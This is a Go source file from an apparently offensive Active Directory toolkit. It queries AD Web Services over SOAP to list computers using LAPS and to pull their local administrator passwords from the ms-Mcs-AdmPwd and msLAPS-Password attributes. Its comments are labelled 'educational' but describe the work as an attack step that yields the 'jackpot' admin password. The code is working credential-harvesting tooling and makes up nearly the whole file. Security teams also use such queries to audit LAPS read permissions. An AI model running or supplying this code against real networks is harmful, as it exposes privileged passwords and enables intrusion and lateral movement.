package adws

import (
	"context"
	"fmt"
)

// EDUCATIONAL: LAPS (Local Administrator Password Solution)
//
// LAPS automatically rotates local admin passwords and stores them in AD.
// The password is stored in the `ms-Mcs-AdmPwd` attribute, readable only
// by authorized users (typically Domain Admins or delegated groups).
//
// Attack relevance:
// 1. Find computers with LAPS enabled
// 2. Check if we can read the password attribute
// 3. If readable, we get the local admin password!
//
// Legacy LAPS:
//   - ms-Mcs-AdmPwd (clear text password)
//   - ms-Mcs-AdmPwdExpirationTime
//
// Windows LAPS (new):
//   - msLAPS-Password (encrypted JSON)
//   - msLAPS-EncryptedPassword
//   - msLAPS-PasswordExpirationTime

// LAPSEntry represents a computer with LAPS information.
type LAPSEntry struct {
	ComputerName      string
	DistinguishedName string
	OperatingSystem   string
	Password          string // Only populated if readable
	ExpirationTime    string
	IsLegacyLAPS      bool // true = ms-Mcs-AdmPwd, false = msLAPS-*
}

// FindLAPSComputers finds all computers with LAPS enabled.
//
// EDUCATIONAL: LAPS Discovery
//
// We look for computers where LAPS attributes exist:
// - Legacy LAPS: ms-Mcs-AdmPwd is present
// - Windows LAPS: msLAPS-Password or msLAPS-EncryptedPassword
//
// This query finds ALL LAPS computers, not just those we can read.
func (c *Client) FindLAPSComputers(ctx context.Context) ([]LAPSEntry, error) {
	// Query for computers with any LAPS attribute
	// Legacy LAPS: ms-Mcs-AdmPwd, Windows LAPS: msLAPS-Password
	filter := `(&(objectClass=computer)(|(ms-Mcs-AdmPwd=*)(msLAPS-Password=*)(msLAPS-EncryptedPassword=*)(ms-Mcs-AdmPwdExpirationTime=*)(msLAPS-PasswordExpirationTime=*)))`

	body := fmt.Sprintf(`<wsen:Enumerate>
      <ad:filter>%s</ad:filter>
      <ad:selection>
        <ad:Path>sAMAccountName</ad:Path>
        <ad:Path>distinguishedName</ad:Path>
        <ad:Path>operatingSystem</ad:Path>
        <ad:Path>ms-Mcs-AdmPwd</ad:Path>
        <ad:Path>ms-Mcs-AdmPwdExpirationTime</ad:Path>
        <ad:Path>msLAPS-Password</ad:Path>
        <ad:Path>msLAPS-PasswordExpirationTime</ad:Path>
      </ad:selection>
    </wsen:Enumerate>`, filter)

	resp, err := c.sendSOAP(ctx, c.enumerateURL(),
		"http://schemas.xmlsoap.org/ws/2004/09/enumeration/Enumerate", body)
	if err != nil {
		return nil, fmt.Errorf("LAPS enumerate failed: %w", err)
	}

	objects, err := parseEnumerateResponse(resp)
	if err != nil {
		return nil, fmt.Errorf("parse failed: %w", err)
	}

	var entries []LAPSEntry
	for _, obj := range objects {
		entry := LAPSEntry{
			ComputerName:      obj.SAMAccountName,
			DistinguishedName: obj.DN,
			OperatingSystem:   obj.Description,
		}

		// Check for OS in raw attributes
		if os, ok := obj.RawAttributes["operatingSystem"]; ok && len(os) > 0 {
			entry.OperatingSystem = os[0]
		}

		// Check for Legacy LAPS password
		if pwd, ok := obj.RawAttributes["ms-Mcs-AdmPwd"]; ok && len(pwd) > 0 {
			entry.Password = pwd[0]
			entry.IsLegacyLAPS = true
		}
		if exp, ok := obj.RawAttributes["ms-Mcs-AdmPwdExpirationTime"]; ok && len(exp) > 0 {
			entry.ExpirationTime = exp[0]
			entry.IsLegacyLAPS = true
		}

		// Check for Windows LAPS password
		if pwd, ok := obj.RawAttributes["msLAPS-Password"]; ok && len(pwd) > 0 {
			entry.Password = pwd[0]
			entry.IsLegacyLAPS = false
		}
		if exp, ok := obj.RawAttributes["msLAPS-PasswordExpirationTime"]; ok && len(exp) > 0 {
			entry.ExpirationTime = exp[0]
			entry.IsLegacyLAPS = false
		}

		entries = append(entries, entry)
	}

	return entries, nil
}

// FindReadableLAPSPasswords finds computers where we can read the LAPS password.
//
// EDUCATIONAL: LAPS Password Extraction
//
// If we have read permissions on ms-Mcs-AdmPwd or msLAPS-Password,
// we get the local admin password. This is the jackpot!
//
// Who can typically read:
// - Domain Admins (by default)
// - Delegated groups (custom ACL)
// - Help desk with explicit permissions
func (c *Client) FindReadableLAPSPasswords(ctx context.Context) ([]LAPSEntry, error) {
	entries, err := c.FindLAPSComputers(ctx)
	if err != nil {
		return nil, err
	}

	// Filter to only those with readable passwords
	var readable []LAPSEntry
	for _, entry := range entries {
		if entry.Password != "" {
			readable = append(readable, entry)
		}
	}

	return readable, nil
}

// LAPSStats provides summary statistics for LAPS deployment.
type LAPSStats struct {
	TotalComputers     int
	LegacyLAPS         int
	WindowsLAPS        int
	PasswordsReadable  int
	PasswordsProtected int
}

// GetLAPSStats returns statistics about LAPS deployment.
func (c *Client) GetLAPSStats(ctx context.Context) (*LAPSStats, error) {
	entries, err := c.FindLAPSComputers(ctx)
	if err != nil {
		return nil, err
	}

	stats := &LAPSStats{
		TotalComputers: len(entries),
	}

	for _, entry := range entries {
		if entry.IsLegacyLAPS {
			stats.LegacyLAPS++
		} else {
			stats.WindowsLAPS++
		}

		if entry.Password != "" {
			stats.PasswordsReadable++
		} else {
			stats.PasswordsProtected++
		}
	}

	return stats, nil
}
